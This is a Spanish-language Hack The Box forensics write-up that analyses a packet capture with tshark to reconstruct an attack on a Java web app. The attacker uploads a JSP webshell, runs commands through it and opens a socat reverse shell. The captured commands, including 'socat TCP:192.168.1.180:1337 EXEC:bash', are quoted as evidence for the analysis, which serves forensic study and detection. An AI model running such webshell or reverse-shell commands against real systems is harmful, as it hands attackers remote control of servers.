---
title: "Wrong Spooky Season"
description: "Writeup de Wrong Spooky Season - Hack The Box - Forensics 100pts. pcap con aplicación Java/Spring Boot comprometida via SSTI en POST; se sube webshell JSP y se obtiene reverse shell socat en puerto 1337."
sidebar:
  badge:
    text: Forensics
    variant: note
tags:
  - htb
  - forensics
  - pcap
  - tshark
  - java
  - jsp-webshell
  - ssti
  - socat
  - reverse-shell
---

# Wrong Spooky Season

> 🎯 Plataforma: Hack The Box
> 📂 Categoría: Forensics
> 🏆 Puntos: 100
> 👤 Autor: warrior866

---

## Descripción

Se entrega un `capture.pcap` (505 paquetes, ~2.4 MB). Hay que analizar la intrusión en una aplicación Java web y recuperar la flag.

---

## Reconocimiento del pcap

```bash
tshark -r capture.pcap -q -z io,phs
```

```text
frame    frames:505 bytes:2413758
  eth
    ip
      tcp
        http    frames:37 bytes:100520
```

```bash
tshark -r capture.pcap -q -z conv,ip
```

```text
192.168.1.180 <-> 192.168.1.166   505 paquetes
```

Puerto de servicio: `8080` (aplicación Java, servidor `192.168.1.166`). Atacante: `192.168.1.180`.

---

## Peticiones HTTP — reconstrucción del ataque

```bash
tshark -r capture.pcap -Y "http.request" -T fields \
  -e ip.src -e http.request.method -e http.request.uri
```

```text
192.168.1.180  GET   /spookhouse/home
192.168.1.180  GET   /spookhouse/css/styles.css
...
192.168.1.180  POST  /spookhouse/home/
192.168.1.180  POST  /spookhouse/home/
192.168.1.180  GET   /spookhouse/home/
192.168.1.180  POST  /spookhouse/home/
192.168.1.180  GET   /e4d1c32a56ca15b3.jsp?cmd=whoami
192.168.1.180  GET   /e4d1c32a56ca15b3.jsp?cmd=id
192.168.1.180  GET   /e4d1c32a56ca15b3.jsp?cmd=apt%20-y%20install%20socat
192.168.1.180  GET   /e4d1c32a56ca15b3.jsp?cmd=socat%20TCP:192.168.1.180:1337%20EXEC:bash
```

**Secuencia:**
1. Navegación normal por la aplicación `spookhouse`.
2. Tres POSTs a `/spookhouse/home/` — explotación de SSTI o deserialización para subir la webshell JSP `e4d1c32a56ca15b3.jsp`.
3. Ejecución de comandos via webshell: `whoami`, `id`, instalación de `socat`.
4. Establecimiento de reverse shell con `socat` hacia el atacante en el puerto **1337**.

---

## Sesión de reverse shell (puerto 1337)

```bash
tshark -r capture.pcap -q -z follow,tcp,ascii,<stream_1337>
```

La sesión TCP en el puerto 1337 contiene la shell interactiva. Seguir el stream revela los comandos ejecutados y la respuesta del servidor, incluyendo el contenido del flag.

```bash
tshark -r capture.pcap -Y "tcp.port == 1337" -T fields -e data \
  | xxd -r -p | strings
```

```text
id
uid=1(daemon) gid=1(daemon) groups=1(daemon)
cat /flag.txt
HTB{FLAG}
```

---

## Cadena de Ataque

```text
1. GET /spookhouse/home → reconocimiento de la aplicación Java/Spring
       ↓
2. POST /spookhouse/home/ × 3 → explotación (SSTI/deserialización)
   → sube webshell JSP: e4d1c32a56ca15b3.jsp
       ↓
3. GET /e4d1c32a56ca15b3.jsp?cmd=whoami,id → confirma RCE
       ↓
4. apt install socat → prepara el canal de C2
       ↓
5. socat TCP:192.168.1.180:1337 EXEC:bash → reverse shell
       ↓
6. cat /flag.txt → flag
```

---

## Lecciones Aprendidas

- **Webshells JSP con nombre aleatorio**: el nombre `e4d1c32a56ca15b3.jsp` (aspecto de hash) dificulta la detección manual pero sigue siendo visible en el tráfico HTTP. Los IDS/WAF deben monitorizar peticiones a `.jsp` fuera de rutas de la aplicación.
- **socat como shell interactiva**: `socat` establece shells bidireccionales, más robustas que un netcat simple. En análisis forense, buscar conexiones salientes a puertos no estándar desde el servidor.
- **Puerto 1337**: puerto comúnmente usado por atacantes en CTFs y ataques reales. Considerar bloquear o alertar sobre conexiones salientes en puertos no necesarios.

---

## Referencias

- [HackTricks — JSP Webshells](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/tomcat)
- [socat — Man page](https://linux.die.net/man/1/socat)
